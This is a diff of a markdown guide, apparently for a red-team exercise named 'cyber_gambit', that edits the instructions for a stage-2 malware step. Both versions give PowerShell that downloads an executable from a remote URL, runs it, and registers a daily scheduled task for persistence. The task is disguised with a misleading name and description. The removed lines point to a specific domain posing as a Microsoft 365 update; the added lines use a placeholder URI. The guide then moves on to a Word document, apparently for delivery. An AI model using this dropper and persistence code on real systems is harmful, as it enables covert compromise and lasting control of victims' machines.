@@ -7,16 +7,16 @@
     ```sh
     subl ~/cyber_gambit/resources/malware/stage2.txt
     ```
-2. Paste in the powershell below.
+2. Paste in the powershell below and make edits as necessary.
 
    ```powershell
-   $url = "http://cpuprok.com/en-us/microsoft-365/update"
-   $outpath = "$env:USERPROFILE\msiexec.exe"
+   $url = "<Malicious Payload download IP/URI>"
+   $outpath = "C:\Program Files\WindowsPowerShell\exe.exe"
    iwr -uri $url -outfile $outpath
    start-process -filepath $outpath
    $action = New-ScheduledTaskAction -Execute $outpath
-   $trigger = New-ScheduledTaskTrigger -Daily -At 9am
-   Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "MSUpdateCheck" -Description "This task grabs Microsoft Official Updates."
+   $trigger = New-ScheduledTaskTrigger -Daily -At 8am
+   Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Valid Schedule" -Description "This task verifies all functions are activated in valid order."
    ```
   > NOTE: Any varibles above can be changed out. 
 3. Open a Microsoft Word Document
